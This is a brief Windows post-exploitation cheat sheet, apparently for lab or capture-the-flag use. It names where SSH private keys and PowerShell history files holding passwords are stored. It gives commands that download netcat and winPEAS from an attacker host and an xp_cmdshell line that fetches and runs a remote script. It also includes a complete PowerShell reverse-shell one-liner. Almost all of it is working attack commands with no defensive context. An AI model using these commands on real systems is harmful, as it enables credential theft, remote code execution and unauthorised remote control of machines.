### File and directory
#### ssh key location
`file:///C:/Users/user/.ssh/id_rsa`
#### File may contain password information
`C:\Users\user\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine
 ConsoleHost_history.txt`


### Command
#### Download file in powershell
```powershell
IWR -useBasicParsing http://10.10.14.21:8000/nc.exe -o nc.exe
```
```powershell
wget http://10.10.14.30/winpeasx64.exe -outfile winpeasx64.exe
```

#### Execute command from remote file
```powershell
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.30/shell.ps1\");"
```

#### Perpare reverse shell
```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.30",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```